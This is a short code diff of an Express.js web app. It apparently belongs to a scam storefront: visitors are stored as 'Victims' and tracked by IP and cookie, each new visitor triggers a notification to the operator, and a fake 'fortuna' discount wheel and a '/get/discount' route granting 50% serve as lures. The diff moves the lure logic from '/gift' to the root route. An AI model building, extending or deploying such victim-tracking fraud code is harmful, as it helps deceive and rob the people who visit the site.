@@ -72,10 +72,6 @@ app.get("/health", (req, res) => {
 });
 
 app.get("/", async (req, res) => {
-    return res.redirect('/gift');
-});
-
-app.get("/gift", async (req, res) => {
     let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
     const victimId = req.cookies.victimId;
     const [victim, created] = await Victims.findOrCreate({
@@ -105,10 +101,6 @@ app.get("/gift", async (req, res) => {
                 console.error('Ошибка при отправке уведомления о новом посетителе:', error);
             }
         }
-    }
-
-    if (victim.discount === 0) {
-        return res.render("fortuna", {victim});
     }
 
     const cartsCount = await Carts.count({
@@ -721,7 +713,7 @@ app.get("/get/discount", async (req, res) => {
             discount: 50
         })
 
-        return res.redirect('/gift');
+        return res.redirect('/');
     } catch (err) {
         return res.sendStatus(404);
     }
